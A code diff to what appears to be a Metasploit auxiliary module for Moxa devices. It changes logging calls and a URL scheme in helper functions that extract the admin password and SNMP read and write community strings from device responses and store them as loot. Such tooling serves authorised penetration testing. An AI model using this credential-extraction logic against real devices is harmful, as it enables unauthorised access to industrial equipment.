@@ -1,5 +1,5 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
@@ -133,11 +133,11 @@ class MetasploitModule < Msf::Auxiliary
   # helper function for extracting password from 0x29 FC response
   def get_pass(response)
     if response.length() < 200
-      print_status("get_pass failed: response not long enough")
+      print_error("get_pass failed: response not long enough")
       return
     end
     pass = get_string(response[200..-1])
-    print_status("password retrieved: #{pass}")
+    print_good("password retrieved: #{pass}")
     store_loot("moxa.get_pass.admin_pass", "text/plain", rhost, pass)
     return pass
   end
@@ -145,22 +145,22 @@ class MetasploitModule < Msf::Auxiliary
   # helper function for extracting snmp community from 0x28 FC response
   def get_snmp_read(response)
     if response.length() < 24
-      print_status("get_snmp_read failed: response not long enough")
+      print_error("get_snmp_read failed: response not long enough")
       return
     end
     snmp_string = get_string(response[24..-1])
-    print_status("snmp community retrieved: #{snmp_string}")
+    print_good("snmp community retrieved: #{snmp_string}")
     store_loot("moxa.get_pass.snmp_read", "text/plain", rhost, snmp_string)
   end
 
   # helper function for extracting snmp community from 0x2C FC response
   def get_snmp_write(response)
     if response.length() < 64
-      print_status("get_snmp_write failed: response not long enough")
+      print_error("get_snmp_write failed: response not long enough")
       return
     end
     snmp_string = get_string(response[64..-1])
-    print_status("snmp read/write community retrieved: #{snmp_string}")
+    print_good("snmp read/write community retrieved: #{snmp_string}")
     store_loot("moxa.get_pass.snmp_write", "text/plain", rhost, snmp_string)
   end
 
@@ -169,7 +169,7 @@ class MetasploitModule < Msf::Auxiliary
   def get_creds(response)
     if response.length() < 200
       # attempt failed. device may not be unlocked
-      print_status("get_creds failed: response not long enough. Will fall back to other functions")
+      print_error("get_creds failed: response not long enough. Will fall back to other functions")
       return -1
     end
     get_snmp_read(response)
